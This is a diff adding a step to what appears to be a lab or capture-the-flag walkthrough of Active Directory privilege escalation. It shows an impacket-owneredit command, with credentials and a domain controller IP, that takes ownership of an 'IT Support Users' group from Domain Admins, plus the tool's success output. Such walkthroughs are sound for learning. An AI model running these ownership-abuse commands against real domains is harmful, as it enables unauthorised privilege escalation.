@@ -615,5 +615,18 @@ The new user has WriteOwner over this group
 # Abusing `WriteOwner` on the `it support users` group
 
 ```python
+impacket-owneredit -action write -new-owner 'steve.wills' -target-dn 'CN=IT SUPPORT USERS,CN=USERS,DC=NOVAFORGE,DC=LOCAL' 'novaforge.local'/'steve.wills':'Password123!' -dc-ip 10.0.0.100
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-4040438430-749096805-303184635-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=novaforge,DC=local
+[*] OwnerSid modified successfully!
+```
+
+First ill take ownership of the group
+
+```python
 
 ```
